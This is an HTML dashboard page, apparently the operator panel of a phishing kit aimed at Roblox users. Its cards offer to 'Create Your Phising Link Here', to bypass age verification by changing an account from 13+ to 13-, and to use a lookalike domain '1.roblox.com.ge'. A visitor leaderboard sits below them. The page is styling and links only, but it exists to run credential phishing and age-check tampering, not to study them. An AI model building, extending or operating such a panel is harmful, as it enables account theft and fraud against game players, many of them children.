<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Dashboard.webcell</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }

    body {
      background: linear-gradient(180deg, #0b0f2a, #11152f);
      color: white;
      min-height: 100vh;
    }

    .container {
      width: 100%;
      padding: 15px;
    }

    /* ===== TOP BAR ===== */
    .topbar {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 20px;
    }

    .menu-btn {
      font-size: 24px;
    }

    .search {
      flex: 1;
      padding: 12px 15px;
      border-radius: 15px;
      border: none;
      background: #1c2044;
      color: white;
    }

    /* ===== CARD ===== */
    .cards {
      display: flex;
      flex-direction: column;
      gap: 15px;
    }

    .card {
      background: #1b1f3a;
      border-radius: 20px;
      padding: 20px;
      text-align: center;
      box-shadow: 0 0 20px rgba(0,255,255,0.15);
    }

    .card h1 {
      font-size: 34px;
      color: aqua;
      margin-bottom: 5px;
    }

    .card p {
      opacity: 0.8;
    }

    /* ===== WARNING ===== */
    .alert {
      margin-top: 10px;
      background: green;
      color: black;
      padding: 12px;
      border-radius: 12px;
      font-weight: bold;
    }

    /* ===== LEADERBOARD ===== */
    .leaderboard {
      margin-top: 20px;
      background: purple;
      border-radius: 20px;
      padding: 15px;
    }

    .leaderboard h3 {
      margin-bottom: 10px;
    }

    .leader-item {
      background: blueviolet;
      padding: 12px;
      border-radius: 12px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    /* ===== PC MODE ===== */
    @media (min-width: 768px) {
      .cards {
        flex-direction: row;
      }

      .card {
        flex: 1;
      }
    }
  </style>
</head>

<body>

  <div class="container">

    <!-- TOP BAR -->
    <div class="topbar">
      <div class="menu-btn">☰</div>
      <input class="search" type="text" placeholder="Cari dashboard...">
    </div>

    <!-- CARDS -->
    <div class="cards">
      <div class="card">
        <h1>Setting</h1>
        <p>Create Your Phising Link Here</p>
        <a href="Controller.html">Controller</a>
        
      </div>

      <div class="card">
        <h1>🛡 Bypass Verications</h1>
        <p>Change Age 13+ to 13-</p>
        <a href="bypassfloko.html">Open Bypassage</a>
        
      </div>
       
      <div class="card">
        <h1>DOMAIN</h1>
        <p>1 Curent Domain Only Ps Sab</p>
        <a href="domainfko.html">1.roblox.com.ge</a>

        <div class="alert">
          🔱 WEB BARU TERBIT HATI2 DUAL

        </div>
      </div>
    </div>

    <div class="leaderboard">
      <h3>🏆 Top Visitor Leaderboard</h3>

      <div class="leader-item">
        🥇 <strong>5139</strong> ?

      </div>
    </div>

  </div>

</body>
</html>
